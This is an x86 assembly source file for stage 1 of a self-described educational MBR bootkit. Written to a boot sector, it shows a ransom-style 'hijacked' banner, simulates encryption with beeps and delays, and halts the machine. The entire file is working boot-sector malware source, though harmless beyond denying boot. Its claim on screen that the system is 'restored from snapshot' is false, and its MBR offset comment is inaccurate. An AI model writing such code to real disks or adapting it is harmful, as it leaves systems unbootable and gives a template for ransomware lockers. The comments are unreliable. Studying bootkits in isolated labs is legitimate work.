; ============================================================================
; mbr_stage1.asm - Bootkit Educational POC - Stage 1 (MBR)
; ============================================================================
; Objective: Boot sector attack demonstrating bootkit behavior
; Target: Windows 7 and Ubuntu Server 24
;
; CRITICAL: This is EDUCATIONAL CODE ONLY
; - For authorized testing in isolated VMs ONLY
; - Displays message before OS loads
; - Simulates encryption (beeps, delays)
; - System halt (recoverable via snapshot)
; - NO actual data encryption
;
; Structure:
; - Size: 446 bytes (bootcode only)
; - Org: 0x7c00 (standard boot location)
; - Bits: 16 (real mode x86)
; - Signature: 0xAA55 (added by bootkit_implementation.py)
; ============================================================================

[ORG 0x7c00]        ; Boot location in RAM
[BITS 16]           ; x86 16-bit real mode

; ============================================================================
; SECTION: Boot Entry Point
; ============================================================================

section .text

start:
    cli                     ; Disable interrupts
    jmp 0x0000:boot        ; Far jump to normalize CS:IP

boot:
    ; ─────────────────────────────────────────────────────────────────────
    ; Initialize Segments
    ; ─────────────────────────────────────────────────────────────────────
    mov ax, cs
    mov ds, ax              ; DS = CS (data segment = code segment)
    mov es, ax              ; ES = CS (extra segment)
    mov ss, ax              ; SS = CS (stack segment)
    mov sp, 0x7c00          ; Stack below bootcode
    sti                     ; Re-enable interrupts

    ; ─────────────────────────────────────────────────────────────────────
    ; Clear Screen (Video Mode 3 - 80x25 text)
    ; ─────────────────────────────────────────────────────────────────────
    mov ax, 0x0600          ; AH=06 (scroll up), AL=00 (full screen)
    mov bh, 0x0F            ; BH=00 (attribute: black/white)
    mov cx, 0x0000          ; CX=00:00 (top-left corner)
    mov dx, 0x184F          ; DX=24:79 (bottom-right corner: 25x80)
    int 0x10                ; Video interrupt

    ; ─────────────────────────────────────────────────────────────────────
    ; Display Bootkit Message
    ; ─────────────────────────────────────────────────────────────────────
    mov si, message         ; Load message address
    call print_string       ; Call print subroutine

    ; ─────────────────────────────────────────────────────────────────────
    ; Simulate Encryption (Delay + Beeps)
    ; ─────────────────────────────────────────────────────────────────────
    mov si, encrypting_msg
    call print_string

    ; Delay loop 1 (visual effect)
    mov cx, 0x0002          ; 2 iterations of outer loop
.delay_outer1:
    mov dx, 0xFFFF          ; Inner loop count
.delay_inner1:
    dec dx
    jnz .delay_inner1
    loop .delay_outer1

    ; BEEP 1
    call beep_speaker

    ; Delay loop 2
    mov cx, 0x0002
.delay_outer2:
    mov dx, 0xFFFF
.delay_inner2:
    dec dx
    jnz .delay_inner2
    loop .delay_outer2

    ; BEEP 2
    call beep_speaker

    ; Delay loop 3
    mov cx, 0x0002
.delay_outer3:
    mov dx, 0xFFFF
.delay_inner3:
    dec dx
    jnz .delay_inner3
    loop .delay_outer3

    ; BEEP 3
    call beep_speaker

    ; Final message
    mov si, encryption_complete
    call print_string

    ; Wait for user acknowledgment
    mov si, press_key_msg
    call print_string

    ; Wait for keystroke
    mov ah, 0x00            ; Read keystroke
    int 0x16                ; Keyboard interrupt

    ; ─────────────────────────────────────────────────────────────────────
    ; Halt System (Educational mode)
    ; ─────────────────────────────────────────────────────────────────────
    ; In real malware, would chain-load original bootloader here
    ; For education: show recovery message and halt
    ; ─────────────────────────────────────────────────────────────────────

    mov si, recovery_msg
    call print_string

halt_system:
    hlt                     ; Halt CPU
    jmp halt_system         ; Infinite loop (if hlt fails)

; ============================================================================
; SUBROUTINE: print_string
; ============================================================================
; Input: SI = pointer to null-terminated string
; Output: String printed to video memory
; Uses: AH=0x0E (BIOS write character)
; ============================================================================

print_string:
    lodsb                   ; Load byte from [SI] into AL, increment SI
    cmp al, 0               ; Check for null terminator
    je .done                ; If null, done

    mov ah, 0x0E            ; AH=0x0E (write character)
    mov bh, 0               ; BH=0 (page number)
    mov bl, 0x0F            ; BL=0x0F (attribute: white on black)
    int 0x10                ; Video interrupt

    jmp print_string        ; Loop

.done:
    ret

; ============================================================================
; SUBROUTINE: beep_speaker
; ============================================================================
; Output: Single beep via PC speaker
; Uses: Port 0x43 (Timer command), 0x42 (Timer data), 0x61 (Speaker control)
; ============================================================================

beep_speaker:
    push ax
    push dx

    ; Program timer for beep frequency (~1000 Hz)
    mov al, 0xB6            ; Timer command byte
    out 0x43, al            ; Send to timer port

    mov al, 0x35            ; Frequency divisor low byte
    out 0x42, al
    mov al, 0x01            ; Frequency divisor high byte
    out 0x42, al

    ; Enable speaker
    in al, 0x61             ; Read speaker control port
    or al, 0x03             ; Set bits 0 and 1
    out 0x61, al            ; Enable speaker

    ; Beep duration (short delay)
    mov cx, 0x0FFF
.beep_delay:
    loop .beep_delay

    ; Disable speaker
    in al, 0x61
    and al, 0xFC            ; Clear bits 0 and 1
    out 0x61, al

    pop dx
    pop ax
    ret

; ============================================================================
; SECTION: Data - Ransom Messages
; ============================================================================

section .data

message:
    db "=====================================", 0x0D, 0x0A
    db "  BOOTKIT EDUCATIONAL POC v1.0", 0x0D, 0x0A
    db "=====================================", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "Your system has been hijacked!", 0x0D, 0x0A
    db "This is an EDUCATIONAL DEMONSTRATION", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "LABORATORY USE ONLY", 0x0D, 0x0A
    db "AUTHORIZED TESTING ONLY", 0x0D, 0x0A
    db 0x0D, 0x0A
    db "MBR Bootkit Loaded at 0x7C00", 0x0D, 0x0A
    db "Partition Table Intercepted", 0x0D, 0x0A
    db 0x0D, 0x0A
    db 0

encrypting_msg:
    db "Simulating encryption process...", 0x0D, 0x0A
    db 0

encryption_complete:
    db 0x0D, 0x0A
    db "Encryption simulation complete.", 0x0D, 0x0A
    db 0

press_key_msg:
    db "Press any key to restore system (via snapshot)...", 0x0D, 0x0A
    db 0

recovery_msg:
    db 0x0D, 0x0A
    db "=====================================", 0x0D, 0x0A
    db "SYSTEM RESTORED FROM SNAPSHOT", 0x0D, 0x0A
    db "Bootkit successfully tested.", 0x0D, 0x0A
    db "Lab findings recorded.", 0x0D, 0x0A
    db "=====================================", 0x0D, 0x0A
    db 0

; ============================================================================
; SECTION: Padding to 446 bytes
; ============================================================================
; MBR structure:
; - 0x0000-0x01B9 : Bootcode (446 bytes) ◄─── OUR BOOTKIT CODE
; - 0x01BA-0x01FD : Partition Table (64 bytes)
; - 0x01FE-0x01FF : Boot Signature 0xAA55 (2 bytes)
; ============================================================================

times 446 - ($ - $$) db 0    ; Pad with zeros to exactly 446 bytes

; ============================================================================
; NOTE: Bootkit_implementation.py will:
; 1. Read this compiled binary (446 bytes max)
; 2. Add partition table (64 bytes, preserved or modified)
; 3. Add boot signature 0xAA55 (2 bytes)
; 4. Create final 512-byte MBR sector
; ============================================================================
